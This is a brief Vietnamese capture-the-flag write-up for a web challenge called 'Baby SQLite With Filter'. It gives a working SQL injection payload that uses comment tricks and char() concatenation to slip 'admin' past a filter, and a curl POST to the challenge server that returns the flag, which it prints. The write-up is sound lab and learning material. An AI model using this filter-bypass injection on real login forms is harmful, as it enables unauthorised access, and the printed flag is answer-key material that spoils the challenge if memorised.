Tham khảo writeups ở: [Baby SQLite With Filter](https://hackmd.io/@D4rUL1eb3rt/SJD_GpKD6?utm_source=preview-mode&utm_medium=rec)

> payload: uid=&upw=&level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))

![img2]()

Hoặc với curl command:

```
┌──(kali㉿B21DCAT077-Giang-Kali)-[~/Desktop/CTF_Basic/CHH_WEB/Baby SQLite With Filter]
└─$ curl -X POST http://103.97.125.56:32169/login -d "uid=ducgiang&upw=ducgiang&level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))"
CHH{uS1nG_5yN7@x_d149raM_26825b5f04893e7e76ba319b054b96d2}
```

> Flag: CHH{uS1nG_5yN7@x_d149raM_26825b5f04893e7e76ba319b054b96d2}
